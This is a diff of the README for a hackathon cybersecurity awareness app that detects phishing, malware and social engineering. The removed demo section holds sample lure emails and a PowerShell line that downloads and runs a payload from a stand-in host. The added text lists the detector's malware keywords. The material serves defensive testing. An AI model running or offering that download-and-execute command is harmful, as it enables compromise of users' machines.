@@ -2,142 +2,327 @@
 
 # 🛡️ SENTINEL AI
 
-### AI-Powered Cybersecurity Intelligence Platform
+### Next-Generation Cybersecurity Intelligence Platform
 
-*The last line of defense between humans and threats.*
+[![Live Demo](https://img.shields.io/badge/🔴_LIVE_DEMO-sentinel--ai.vercel.app-00FFEA?style=for-the-badge&labelColor=080C18)](https://sentinel-ai-nandish.vercel.app)
+[![React](https://img.shields.io/badge/React_18-61DAFB?style=for-the-badge&logo=react&logoColor=000)](https://react.dev)
+[![Vite](https://img.shields.io/badge/Vite_8-646CFF?style=for-the-badge&logo=vite&logoColor=fff)](https://vitejs.dev)
+[![Claude AI](https://img.shields.io/badge/Claude_AI-FF6B35?style=for-the-badge&logo=anthropic&logoColor=fff)](https://anthropic.com)
+[![Vercel](https://img.shields.io/badge/Vercel-000?style=for-the-badge&logo=vercel&logoColor=fff)](https://vercel.com)
 
-[![React](https://img.shields.io/badge/React-18-61DAFB?style=flat-square&logo=react)](https://reactjs.org/)
-[![Vite](https://img.shields.io/badge/Vite-5-646CFF?style=flat-square&logo=vite)](https://vitejs.dev/)
-[![Node.js](https://img.shields.io/badge/Node.js-20-339933?style=flat-square&logo=node.js)](https://nodejs.org/)
-[![TailwindCSS](https://img.shields.io/badge/Tailwind-4-06B6D4?style=flat-square&logo=tailwindcss)](https://tailwindcss.com/)
+<br/>
+
+> **⚡ AI-powered threat analysis engine that identifies phishing, malware, and social engineering attacks in real-time.**
+
+<br/>
+
+<img src="https://img.shields.io/badge/STATUS-PRODUCTION_READY-00FFA3?style=flat-square&labelColor=111827" />
+<img src="https://img.shields.io/badge/HACKATHON-CODESTORM_2K26-FFB700?style=flat-square&labelColor=111827" />
+<img src="https://img.shields.io/badge/UNIVERSITY-GTU_School_of_Engineering-00FFEA?style=flat-square&labelColor=111827" />
+
+---
+
+</div>
+
+## 🎯 What is SENTINEL AI?
+
+**SENTINEL AI** is a full-stack cybersecurity intelligence platform that uses AI to detect and analyze digital threats. Built for the **CODESTORM 2K26 Hackathon** at GTU School of Engineering, it provides real-time threat classification, interactive security training, and comprehensive awareness scoring.
+
+> Think of it as your personal cybersecurity analyst — paste any suspicious email, URL, message, or code, and SENTINEL will tell you exactly what's wrong, why it's dangerous, and what to do about it.
+
+---
+
+## ✨ Core Features
+
+### ⚡ Threat Analyzer
+The flagship feature — a dual-panel analysis engine with real-time AI classification.
+
+| Feature | Description |
+|---------|-------------|
+| **Multi-Type Analysis** | Supports EMAIL, URL, MESSAGE, and CODE content types |
+| **Threat Classification** | Categorizes as Phishing, Malware, Social Engineering, or Safe |
+| **Severity Scoring** | Low / Medium / High with visual threat meter |
+| **Confidence Rating** | 0-100% AI confidence score |
+| **Threat DNA** | 5-axis breakdown: Urgency, Impersonation, Link Manipulation, Authority Abuse, Fear Tactics |
+| **Attack Vector ID** | Identifies the specific attack technique used |
+| **Threat Indicators** | Highlights specific red flags found in the content |
+| **Educational Tips** | Learn from each analysis with actionable security advice |
+| **Deep Scan Mode** | Enhanced analysis depth for obfuscated threats |
+
+### 🎯 Phishing Simulator
+Interactive training module with 6 real-world phishing scenarios.
+
+- ⏱️ **30-second timed challenges** — think fast under pressure
+- 🔴 **Red flag highlighting** — shows exactly what to look for
+- 📊 **Scoring system** — earn points for correct identifications
+- 📝 **Detailed explanations** — learn why each email is safe or dangerous
+- 🏆 **Performance rating** — from Novice to Cyber Defender
+
+### 🤖 SENTINEL Chat
+AI-powered cybersecurity assistant for learning and Q&A.
+
+- Pre-built suggestion chips for common questions
+- Explains phishing, malware, social engineering, safe browsing
+- Powered by Claude AI with fallback responses
+
+### 📊 Intelligence Dashboard
+Real-time analytics and session overview.
+
+- **KPI Cards** — Total Scans, Threats Found, Safe Cleared, Awareness Score
+- **Threat Type Breakdown** — Visual chart of detection categories
+- **Severity Distribution** — Bar chart of Low/Medium/High threats
+- **Live Threat Feed** — Real-time log of all analyses
+
+### 📋 Threat History
+Complete audit log with full report drill-down.
+
+- Searchable and filterable scan history
+- Slide-out drawer with full analysis details
+- Classification badges, severity chips, confidence scores
+
+### 🧠 Awareness Score Hub
+Gamified cybersecurity learning with achievement badges.
+
+- **Dynamic Score Ring** — Visual progress indicator (0-100)
+- **6 Achievement Badges** — First Catch, Eagle Eye, Safe Zone, Simulator Pro, Speed Analyst, Perfect Score
+- **Score Progression Chart** — Track your growth over time
+- **Level System** — Novice → Trainee → Cyber Aware → Security Pro → Cyber Defender
+
+### 📄 Report Center
+Export professional reports for submission and documentation.
+
+- **PDF Export** — Print-ready formatted report
+- **JSON Export** — Machine-readable data export
+- **Clipboard Copy** — Quick summary sharing
+- CODESTORM 2K26 branded report header with threat ID
+
+---
+
+## 🛠️ Tech Stack
+
+<div align="center">
+
+| Layer | Technology | Purpose |
+|-------|-----------|---------|
+| **Frontend** | React 18 + Vite 8 | Component-based UI with HMR |
+| **Styling** | Custom CSS + Tailwind | Glassmorphism design system |
+| **Animations** | Framer Motion | Smooth page transitions and micro-interactions |
+| **Charts** | Recharts | Data visualization (line, bar, pie charts) |
+| **Typography** | Syne + Space Mono | Premium cyber aesthetic |
+| **Backend** | Express.js + Node.js | RESTful API server |
+| **AI Engine** | Claude AI / GPT-4o | Intelligent threat analysis |
+| **Fallback** | Heuristic Engine | Pattern-matching analysis (works offline) |
+| **Deployment** | Vercel Serverless | Auto-deployed from GitHub |
+| **Notifications** | React Hot Toast | Real-time feedback system |
 
 </div>
 
 ---
 
-## ⚡ What is SENTINEL AI?
+## 🎨 Design System
 
-SENTINEL AI is a production-grade cybersecurity awareness and threat intelligence platform that uses AI to analyze suspicious content, train users against phishing attacks, and track security awareness progression — all wrapped in a stunning dark-themed SOC (Security Operations Center) interface.
+SENTINEL uses a custom **cybersecurity-themed design system** built from scratch:
 
-## 🚀 Features
+```
+Background:    #080C18  (Deep Navy)
+Cyan Accent:   #00FFEA  (Primary - actions, highlights)
+Red Alert:     #FF2052  (Threats, danger indicators)
+Green Safe:    #00FFA3  (Safe content, success states)
+Amber Warning: #FFB700  (Medium severity, achievements)
+```
 
-| Feature | Description |
-|---------|-------------|
-| **🔍 Threat Analyzer** | AI-powered analysis of emails, URLs, messages, and code with severity scoring, threat DNA breakdown, and actionable reports |
-| **📊 Intelligence Dashboard** | Real-time security operations overview with interactive charts, KPIs, live feed, and threat category breakdown |
-| **🎯 Phishing Simulator** | 6 interactive training scenarios with realistic email mockups, timed challenges, red flag highlighting, and scoring |
-| **🤖 SENTINEL Chat** | AI security assistant for cybersecurity education with curated knowledge base |
-| **📋 Threat History** | Searchable, filterable log of all analyses with detailed side-drawer view |
-| **📄 Report Center** | Professional report generation with PDF, JSON, and clipboard export options |
-| **🧠 Awareness Score** | Gamified progression system with achievements, XP tracking, and level badges |
+- **Glassmorphism cards** with `rgba(255,255,255,0.03)` backgrounds
+- **44px grid overlay** for subtle cyber-grid aesthetic
+- **210px fixed sidebar** with gradient logo and pulse indicators
+- **Monospace data display** using Space Mono for all metrics
 
-## 🛠️ Tech Stack
+---
 
-**Frontend:** React 18 · Vite · Tailwind CSS v4 · Framer Motion · Recharts · Lucide Icons · React Hot Toast
+## 🚀 Quick Start
 
-**Backend:** Node.js · Express · OpenAI GPT-4o-mini
+### Prerequisites
+- Node.js 18+
+- npm or yarn
 
-**Design:** Dark theme (#0A0E1A) · Glassmorphism · Animated grid background · Inter + JetBrains Mono fonts
-
-## 📦 Quick Start
+### Installation
 
 ```bash
-# 1. Clone and enter directory
-cd sentinel-ai
+# Clone the repository
+git clone https://github.com/SouLfieRce/Sentinal_Ai.git
+cd Sentinal_Ai/sentinel-ai
 
-# 2. Install all dependencies
-npm run install:all
+# Install frontend dependencies
+cd client
 npm install
 
-# 3. (Optional) Add your OpenAI API key for AI-powered analysis
-#    Edit .env and replace sk-your-openai-api-key-here with your key
-#    Without an API key, SENTINEL uses intelligent heuristic analysis
+# Install backend dependencies
+cd ../server
+npm install
+```
 
-# 4. Start the application
+### Running Locally
+
+```bash
+# Terminal 1 — Start the backend server
+cd server
+node index.js
+# ⚡ SENTINEL AI Server running on port 3001
+
+# Terminal 2 — Start the frontend dev server
+cd client
 npm run dev
+# ➜ Local: http://localhost:5173/
 ```
 
-The app runs on **http://localhost:5173** with the API server on port 3001.
+### Environment Variables
 
-## 🔑 API Key Setup (Optional)
+Create a `.env` file in the root `sentinel-ai/` directory:
 
-SENTINEL AI works out of the box without an API key using built-in heuristic analysis. For enhanced AI-powered analysis:
+```env
+# Optional: AI-powered analysis (leave default for heuristic fallback)
+OPENAI_API_KEY=sk-your-openai-api-key-here
 
-1. Get an API key from [OpenAI](https://platform.openai.com/)
-2. Edit `.env` and set `OPENAI_API_KEY=sk-your-actual-key`
-3. Restart the server
-
-## 🎯 Demo Script (60 seconds)
-
-> *"We built SENTINEL AI — an AI-powered cybersecurity intelligence platform. Let me show you what it can do."*
-
-1. **Threat Analyzer** — Paste a phishing email → watch the dramatic analysis animation → see the threat verdict with severity meter, AI report, and threat DNA breakdown
-2. **Dashboard** — Show real-time stats updating with charts and live feed
-3. **Phishing Simulator** — Run through a scenario, show red flag highlighting
-4. **Awareness Score** — Show gamification with achievements unlocking
-5. **Export** — Generate a professional PDF report
-
-## 📝 Test Inputs for Demo
-
-**Phishing Email:**
-```
-From: security@paypa1-verify.com
-Subject: Your account has been suspended!
-
-Dear Customer, we detected unauthorized access to your PayPal account.
-Click here immediately to verify your identity: https://paypa1-verify.com/login
-Failure to verify within 24 hours will result in permanent account suspension.
+# Server configuration
+PORT=3001
+CLIENT_URL=http://localhost:5173
 ```
 
-**Phishing Email 2:**
-```
-Congratulations! You've been selected as this month's winner of a $500 Amazon Gift Card!
-Claim now at: http://amaz0n-rewards.com/claim?id=winner2026
-Offer expires in 1 hour. Act now!
-```
+> 💡 **No API key needed!** SENTINEL works out of the box with its built-in heuristic analysis engine. Add an OpenAI API key for enhanced AI-powered analysis.
 
-**Malware:**
-```
-URGENT: Please enable macros and download the attached invoice.exe
-Run the following to update: powershell -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://mal-server.com/payload')"
-```
-
-**Social Engineering:**
-```
-Hi, this is the CEO speaking. I need you to urgently wire $5,000 to this account for a confidential deal. Don't tell anyone and keep this between us. Send it via Western Union ASAP.
-```
-
-**Safe Content:**
-```
-Hey team, just a reminder that our weekly standup is tomorrow at 10am.
-The meeting link is the same as usual. See you there!
-```
+---
 
 ## 📁 Project Structure
 
 ```
 sentinel-ai/
-├── client/                 # React + Vite frontend
+├── client/                    # React Frontend (Vite)
+│   ├── api/                   # Vercel Serverless Functions
+│   │   ├── analyze.js         # /api/analyze endpoint
+│   │   ├── chat.js            # /api/chat endpoint
+│   │   └── health.js          # /api/health endpoint
 │   ├── src/
-│   │   ├── components/     # Reusable UI components
-│   │   ├── pages/          # 7 application pages
-│   │   ├── context/        # Global state management
-│   │   ├── hooks/          # Custom React hooks
-│   │   └── utils/          # Report generation utilities
-│   └── index.html
-├── server/                 # Node.js + Express backend
-│   ├── routes/             # API routes (analyze, chat)
-│   └── index.js            # Server entry point
-├── .env                    # Environment configuration
-└── package.json            # Root scripts
+│   │   ├── components/        # Reusable UI components
+│   │   │   ├── Sidebar.jsx    # 210px sidebar with navigation
+│   │   │   ├── Header.jsx     # Topbar with live indicators
+│   │   │   ├── ThreatMeter.jsx # Circular severity gauge
+│   │   │   ├── ThreatDNA.jsx  # 5-axis threat breakdown
+│   │   │   ├── ScoreRing.jsx  # Animated score indicator
+│   │   │   └── AnalysisLoader.jsx
+│   │   ├── pages/             # Application pages
+│   │   │   ├── Analyzer.jsx   # ⚡ Threat Analyzer
+│   │   │   ├── Dashboard.jsx  # 📊 Intelligence HQ
+│   │   │   ├── Simulator.jsx  # 🎯 Phishing Simulator
+│   │   │   ├── Chat.jsx       # 🤖 SENTINEL Chat
+│   │   │   ├── History.jsx    # 📋 Threat History
+│   │   │   ├── Reports.jsx    # 📄 Report Center
+│   │   │   └── AwarenessHub.jsx # 🧠 Awareness Score
+│   │   ├── context/           # React Context (state management)
+│   │   ├── hooks/             # Custom hooks
+│   │   ├── utils/             # Utility functions
+│   │   ├── App.jsx            # Root layout + routing
+│   │   ├── index.css          # Design system (single source of truth)
+│   │   └── main.jsx           # Entry point
+│   ├── vercel.json            # Vercel deployment config
+│   └── package.json
+├── server/                    # Express Backend
+│   ├── routes/
+│   │   ├── analyze.js         # Threat analysis API
+│   │   └── chat.js            # Chat API
+│   └── index.js               # Server entry point
+└── .env                       # Environment variables
 ```
+
+---
+
+## 🔒 How the Analysis Engine Works
+
+SENTINEL uses a **dual-layer analysis architecture**:
+
+### Layer 1: AI-Powered Analysis (with API key)
+Uses Claude AI or GPT-4o for deep semantic understanding of threats, detecting:
+- Obfuscated phishing attempts
+- Context-aware social engineering
+- Subtle malware distribution patterns
+
+### Layer 2: Heuristic Fallback (no API key needed)
+A built-in pattern-matching engine that scans for:
+
+```
+📧 Phishing Signals     → "verify your account", "click here", "urgent", "suspended"...
+🦠 Malware Signals      → "download", "exe", ".bat", "powershell", "macro"...
+🧠 Social Eng Signals   → "wire transfer", "gift card", "confidential", "trust me"...
+🔗 URL Analysis         → IP addresses, shortened URLs, typosquatting detection
+```
+
+Both layers produce identical output format with **classification, severity, confidence, threat DNA, indicators, and educational tips**.
+
+---
+
+## 🏆 Scoring System
+
+| Action | Points |
+|--------|--------|
+| Correctly identify a threat | +15 pts |
+| Correctly clear safe content | +10 pts |
+| Complete simulator correctly | +20 pts |
+| False positive (wrong flag) | -5 pts |
+
+### Achievement Badges
+
+| Badge | Requirement |
+|-------|------------|
+| 🎯 First Catch | Detect your first threat |
+| 🦅 Eagle Eye | 5 threats detected in a row |
+| 🟢 Safe Zone | 3 safe contents cleared correctly |
+| 🏆 Simulator Pro | Complete all training scenarios |
+| ⚡ Speed Analyst | Analyze 10+ items |
+| 💎 Perfect Score | Reach 100 awareness score |
+
+---
+
+## 🌐 Deployment
+
+### Vercel (Production)
+The app auto-deploys from GitHub to Vercel with serverless API functions:
+
+- **Frontend**: Static build from `client/dist/`
+- **API Routes**: Serverless functions from `client/api/`
+- **Zero backend needed** — everything runs on Vercel's edge network
+
+### Manual Deployment
+
+```bash
+cd client
+npm run build
+# Output in client/dist/ — deploy to any static host
+```
+
+---
+
+## 👥 Team
+
+<div align="center">
+
+**CODESTORM 2K26 Hackathon**
+
+Built with ❤️ at **GTU School of Engineering**
+
+</div>
+
+---
+
+## 📝 License
+
+This project is built for the CODESTORM 2K26 Hackathon. All rights reserved.
 
 ---
 
 <div align="center">
 
-**Built for CODESTORM HACKATHON 2K26**
+**Built with 🛡️ by Team SENTINEL**
 
-Made with ⚡ by the SENTINEL AI Team
+[![Deploy](https://img.shields.io/badge/DEPLOY_TO_VERCEL-000?style=for-the-badge&logo=vercel)](https://vercel.com/new/clone?repository-url=https://github.com/SouLfieRce/Sentinal_Ai)
+
+*Protecting the digital world, one scan at a time.*
 
 </div>
